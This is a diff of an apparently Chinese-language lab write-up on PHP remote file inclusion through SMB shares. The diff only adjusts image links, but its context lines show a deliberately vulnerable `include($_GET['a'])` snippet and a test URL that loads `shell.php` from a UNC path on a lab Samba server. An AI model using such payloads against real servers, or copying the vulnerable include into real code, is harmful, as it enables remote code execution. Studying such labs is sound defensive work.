@@ -20,7 +20,7 @@ SambaA: `192.168.31.140`为Centos 7 的samba服务器
 WinWebB: `192.168.31.139`Windows 10 的PHP WEB Server
 
 
-![](../uploads/smb1.png)
+![](/uploads/smb1.png)
 
 编辑smb配置文件
 
@@ -85,6 +85,8 @@ setenforce 0
 ```
 关闭seclinux发现出现`shell.php`了。
 
+![](/uploads/smb3.png)
+
 
 ### 3. 测试远程文件包含
 
@@ -101,6 +103,8 @@ include($_GET['a']);
 
 文件包含成功。
 
+![](/uploads/smb4.png)
+
 ### 4. 更换Web Server平台为Mac
 
 利用smb可以再刚才的WinWebB 的 Windows 10机器上成功的进行了远程文件包含。
@@ -110,6 +114,9 @@ include($_GET['a']);
 在MacWeb Server C 下同样执行`3`中的操作。
 
 然后访问`http://localhost/test.php?file=\\192.168.31.140\icatest\shell.php`直接报错。
+
+![](/uploads/smb2.png)
+
 
 ### 5. 结论
 
